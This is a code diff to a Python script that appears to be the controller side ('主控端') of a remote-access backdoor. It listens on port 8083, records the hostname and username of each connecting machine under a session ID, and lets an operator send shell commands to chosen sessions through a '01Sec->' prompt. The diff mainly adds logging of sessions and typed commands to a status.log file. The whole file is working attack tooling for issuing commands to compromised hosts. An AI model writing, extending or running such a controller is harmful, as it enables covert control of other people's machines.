@@ -3,6 +3,7 @@ import sys
 import threading
 import random
 import time
+import logging
 
 
 __banner__ = '''
@@ -37,60 +38,69 @@ __help__ = '''
 
 
 conns = {}
+logging.basicConfig(filename="status.log", format="%(asctime)s -%(name)s-%(levelname)s-%(module)s:%(message)s", datefmt='%Y-%m-%d %H:%M:%S %p', level=logging.DEBUG)
 
 
 def init_server(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    print('[+] 初始化套接字成功')
+    logging.info("[+] 初始化套接字")
+    print("[+] 初始化套接字")
     try:
         s.bind((host, port))
     except socket.error as e:
-        print('[!]', e)
+        logging.error("[!]", e)
+        print("[!]", e)
         sys.exit()
 
     s.listen(50)
-    print('[+] 主控端监听在%s:%d' % (host, port))
+    logging.info("[+] 主控端监听在%s:%d" % (host, port))
+    print("[+] 主控端监听在%s:%d" % (host, port))
     return s
 
 
 def clientthread(conn):
     session_id = random.randint(1, 100)
     conns[session_id] = conn
-    conn.send(b'')
+    conn.send(b"")
 
     while True:
-        data = conn.recv(1024)
+        try:
+            data = conn.recv(1024)
+        except Exception as e:
+            logging.error(e)
+            break
         comInfo = data.decode().split("@")
         if not data:
             break
+
+        logging.info("[+] 主机名: %s 用户名: %s sid：%d" % (comInfo[0], comInfo[1], session_id))
         print("[+] 主机名: %s 用户名: %s sid：%d" % (comInfo[0], comInfo[1], session_id))
 
-    print("[!] 连接断开")
+    logging.warning("[!] 连接断开")
+    print("\n" + "[!] 连接断开")
     conn.close()
 
 
 def inputter():
     while True:
-        try:
-            command = input("01Sec->")
-            if ">>" in command:
-                shell = command.split(">>", 3)
-                sessionid = shell[0]
-                conns[int(sessionid)].sendall(str.encode(shell[1]))
-                time.sleep(1)
-            elif "sessions" == command:
-                print(conns)
-            while "shell" in command:
-                cmd = command.split(">>", 3)
-                cmd1 = input("01Sec->" + cmd[0] + "->" + cmd[1] + "->")
-                if "exit" == cmd1:
-                    break
-                else:
-                    conns[int(cmd[0])].sendall(str.encode(cmd1))
-                    continue
-        except:
-            print("参数错误")
+        command = input("01Sec->")
+        logging.info(command)
+        if ">>" in command:
+            shell = command.split(">>", 3)
+            sessionid = shell[0]
+            conns[int(sessionid)].sendall(str.encode(shell[1]))
+            time.sleep(1)
+        elif "sessions" == command:
+            print(conns)
+        while "shell" in command:
+            cmd = command.split(">>", 3)
+            cmd1 = input("01Sec->" + cmd[0] + "->" + cmd[1] + "->")
+            if "exit" == cmd1:
+                break
+            else:
+                conns[int(cmd[0])].sendall(str.encode(cmd1))
+                continue
 
 
 if __name__ == '__main__':
@@ -99,7 +109,9 @@ if __name__ == '__main__':
     s = init_server("0.0.0.0", 8083)
     while True:
         conn, addr = s.accept()
-        print('[+] 一个新连接来自' + addr[0] + ':' + str(addr[1]))
+        logging.info("[+] 一个新连接来自" + addr[0] + ":" + str(addr[1]))
+        print("[+] 一个新连接来自" + addr[0] + ":" + str(addr[1]))
+
 
         threading.Thread(target=clientthread, args=(conn,)).start()
         threading.Thread(target=inputter, args=()).start()
